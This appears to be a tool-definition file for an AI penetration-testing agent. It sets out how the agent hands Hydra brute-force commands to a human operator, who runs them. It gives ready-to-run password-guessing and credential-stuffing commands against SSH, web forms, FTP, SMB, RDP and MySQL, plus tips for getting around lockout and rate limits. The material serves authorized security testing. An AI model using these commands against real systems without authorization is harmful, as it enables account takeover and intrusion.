---
name: hydra
description: Operator-assisted Hydra workflows for online credential brute-forcing against network services and web forms
category: tools
tags: [brute-force, credentials, authentication, operator-assisted]
---

# Hydra

Fast online password brute-forcer supporting 50+ protocols including HTTP, SSH, FTP, SMB, RDP, databases, and web forms. Use for credential testing when usernames are known.

## When to Request

- After discovering valid usernames (from enumeration, OSINT, or application responses)
- Against login forms, SSH, FTP, RDP, database services, and admin panels
- When testing default credentials at scale
- After credential leaks to test password reuse across services

## Operator-Assisted Workflow

1. Agent identifies target service, discovered usernames, and authentication endpoint
2. Agent provides Hydra command with protocol, target, user/pass lists, and form parameters
3. Operator runs Hydra and reports successful credentials
4. Agent uses valid credentials to authenticate and continue assessment
5. Agent tests discovered credentials against all other services (credential reuse)

## Key Commands

### SSH
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4 -o hydra_ssh.txt
```

### HTTP POST Form
```
hydra -l admin -P passwords.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -o hydra_web.txt
```

### HTTP Basic Auth
```
hydra -l admin -P passwords.txt TARGET http-get /admin -o hydra_basic.txt
```

### FTP
```
hydra -L users.txt -P passwords.txt ftp://TARGET -t 10 -o hydra_ftp.txt
```

### SMB
```
hydra -L users.txt -P passwords.txt smb://TARGET -o hydra_smb.txt
```

### RDP
```
hydra -l administrator -P passwords.txt rdp://TARGET -t 1 -o hydra_rdp.txt
```

### MySQL
```
hydra -l root -P passwords.txt mysql://TARGET -o hydra_mysql.txt
```

### Multiple Targets
```
hydra -L users.txt -P passwords.txt -M targets.txt ssh -t 4 -o hydra_multi.txt
```

### Credential Stuffing (User:Pass Combos)
```
hydra -C creds.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=failed" -o hydra_stuffing.txt
```

## Output Analysis

- **Valid credentials** -- immediate win; authenticate and test for privilege levels
- **Account lockout triggered** -- note lockout policy; adjust timing or switch to credential stuffing
- **Rate limiting detected** -- reduce threads, add delays; consider distributed approach
- **Partial success** -- some accounts valid; test credential reuse on other services

## Integration with Strix

- Agent provides discovered usernames from web app enumeration for Hydra targeting
- Valid credentials feed into Strix proxy for authenticated application testing
- Credential reuse findings expand access across services discovered in recon
- Successful authentication informs privilege escalation testing within the application

## Operator Help

To provide tool output for this request, save the full command output to the
HIL inbox file indicated by the agent:

```
strix/hil/inbox/resp_<TASK_ID>.txt
```

You can also pipe output directly:

```
hydra [OPTIONS] TARGET > strix/hil/inbox/resp_<TASK_ID>.txt
```

The agent will automatically detect and parse the response.  See the
`HIL_INBOX_PATH` environment variable to customise the inbox location.
